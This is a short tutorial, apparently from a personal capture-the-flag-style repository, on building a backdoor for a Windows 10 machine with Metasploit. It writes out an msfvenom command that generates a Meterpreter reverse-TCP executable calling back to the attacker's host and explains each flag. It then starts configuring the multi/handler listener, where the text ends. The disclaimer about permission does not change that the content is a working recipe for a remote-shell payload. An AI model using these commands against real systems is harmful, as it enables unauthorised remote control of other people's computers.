### Backdoor Windows Exploitation

In this tutorial we are hacking into a Windows 10 machine creating a backdoor exploit with Metasploit Framework.

This repository is dedicated to show how i go through Hacking challenges. 
Created only for learning pourposes and all the solutions and tricks are used at controlled environments.

#### DO NOT HACK WITHOUT PERMISSION ! 

#### Happy Hacking ðŸ˜ƒ

### Step 01
For this i'll be using [Metasploit Framework.](https://www.metasploit.com/)

You can check more about at their website.

So... first let's open metasploit command line interface.

````
msfconsole
````

After that you need to create the file with the backdoor exploiting configuration.

You do it by running the command:

````
msfvenom -p windows/meterpreter/reverse_tcp LHOST-<your-ip> LPORT-<any-port> -f exe -o /path-to-any-directory-you-want/rs_exploit.exe
````

### But, let's break this command down
 - **msfvenom** is a powerful tool within the Metasploit Framework used for generating payloads.
 - **-p windows/meterpreter/reverse_tcp** creates the payload with the connection you need to the Windows machine.
 - **LHOST-<your-ip>** is the host ip, your machine ip that will receive the targets connection.
 - **LPORT-<any-port>** the port where we want to connect back to the target.
 - **-f exe** because we want to create a executable file.
 - **-o /path-to-any-directory-you-want/rs_exploit.exe** is the output directory.


#### Ok, so this created the payload that will get transferred over to your **Windows** target.


### Step 02

Now we need to tell **Metasploit** we're gonna use a **Handler**.

We must make sure that **Metasploit** will listen to the connection.

And you can do this by running the following command

````
use exploit/multi/handler
````
